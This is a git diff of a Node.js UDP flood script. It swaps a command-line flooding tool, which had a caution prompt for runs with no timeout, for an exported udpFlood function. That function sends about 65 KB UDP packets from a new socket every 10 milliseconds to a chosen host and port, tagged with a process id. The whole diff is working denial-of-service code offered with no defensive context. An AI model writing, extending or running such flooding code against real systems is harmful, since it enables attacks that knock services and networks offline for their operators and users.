@@ -1,62 +1,34 @@
-let program = require('commander');
-const Confirm = require('prompt-confirm');
+let dgram = require('dgram');
 
-let programHelp = program
-    .version('0.1.0')
-    .option('-h, --host <host>', 'Host Name/IP')
-    .option('-p, --port [port]', 'If not defined, program will use random ports.', parseInt)
-    .option('-t, --timeout [timeout]', 'Timeout in millisecond. If not defined, it will be unlimited.', parseInt);
-
-programHelp.parse(process.argv);
-
-if (program.host) {
-
-    if (!program.timeout) {
-        new Confirm('CAUTION: You are running flood without any timeout to stop, you can define a timeout with --timeout. Continue? [Y/N] ')
-            .ask(function (answer) {
-                console.log(answer);
-                if (!answer) {
-                    console.log('Ok, run program again with --timeout parameter.');
-                    process.stdin.destroy();
-                } else {
-                    udpFlood(program.host, program.port, null);
-                }
-            });
-    } else {
-        udpFlood(program.host, program.port, program.timeout);
-    }
-
-} else {
-    programHelp.help();
-}
-
-function udpFlood(host, port, timeout) {
-
-    let HOST = host;
-    let dgram = require('dgram');
-    let client = dgram.createSocket('udp4');
+function udpFlood(ips, port, timeout, pid) {
+    let HOST = ips;
 
     let output = "";
-    for (var i = 65500; i >= 0; i--) {
+    for (let i = 65500; i >= 0; i--) {
         output += "X";
     }
     let startTime = new Date();
-    while (1) {
-
+    const intervalObj = setInterval(() => {
         if (timeout) {
-            var nowTime = new Date();
+            let nowTime = new Date();
             if (nowTime.getTime() >= (startTime.getTime() + timeout)) {
-                break;
+                console.log('Timeout Reached for pid: ' + pid);
+                clearInterval(intervalObj);
             }
         }
-
+        // const randomPort = Math.floor(Math.random() * (65535) + 1);
+        let socket = dgram.createSocket('udp4');
         let message = Buffer.from(output);
 
-        (function (PORT) {
-            client.send(message, 0, message.length, PORT, HOST, function (err, bytes) {
-                if (err) throw err;
-                console.log('UDP message sent to ' + HOST + ':' + PORT);
-            });
-        })(port || Math.floor(Math.random() * (65535) + 1));
-    }
+        socket.send(message, 0, message.length, port, HOST, function (err, bytes) {
+            if (err) throw err;
+            console.log('pid: ' + pid + ' sent package UDP with ' + bytes + ' bytes message to ' + HOST + ':' + port + ' from ' + socket.address().address + ':' + socket.address().port);
+        });
+
+        // socket.on('message', (msg, rinfo) => {
+        //     console.log(`server got: ${msg} from ${rinfo.address}:${rinfo.port}`);
+        // });
+    }, 10)
 }
+
+module.exports = udpFlood;
